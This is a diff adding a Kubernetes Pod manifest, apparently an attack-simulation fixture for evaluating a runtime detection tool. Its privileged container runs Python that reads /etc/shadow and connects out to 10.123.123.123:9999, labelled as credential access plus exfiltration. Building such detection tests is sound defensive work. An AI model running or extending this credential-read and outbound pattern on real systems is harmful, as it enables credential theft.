@@ -1,0 +1,21 @@
+# Attack: credential access + exfil (T1003.008 + T1041). read /etc/shadow, then connect out.
+apiVersion: v1
+kind: Pod
+metadata: {name: cred-access, namespace: ariguard-eval, labels: {app.kubernetes.io/part-of: ariguard-eval}}
+spec:
+  restartPolicy: Never
+  containers:
+    - name: attacker
+      image: python:3.12-slim
+      securityContext: {privileged: true}
+      command: ["python3","-c"]
+      args:
+        - |
+          import socket, time
+          time.sleep(8)
+          try: open("/etc/shadow","rb").read(1)
+          except Exception: pass
+          s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+          try: s.connect(("10.123.123.123", 9999))   # outbound (terminal -> kill)
+          except Exception: pass
+          time.sleep(10)
